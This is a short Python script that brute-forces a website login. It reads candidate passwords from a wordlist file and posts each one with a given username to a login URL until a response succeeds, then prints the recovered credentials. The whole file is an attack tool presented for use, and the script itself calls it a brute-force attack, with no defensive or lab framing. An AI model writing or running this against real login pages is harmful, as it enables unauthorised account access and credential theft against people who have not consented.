import requests

def brute_force_login(username):
    password_file = open("passlist.txt", "r")
    passwords = password_file.readlines()
    password_file.close()

    for password in passwords:
        password = password.strip()
        login_data = {
            "username": username,
            "password": password
        }
        response = requests.post("https://example.com/login", data=login_data)

        if response.status_code == 200:
            print("Login successful!")
            print("Username:", username)
            print("Password:", password)
            break

    print("Brute force attack completed.")

# Usage example
username = input("Enter the username: ")
brute_force_login(username)
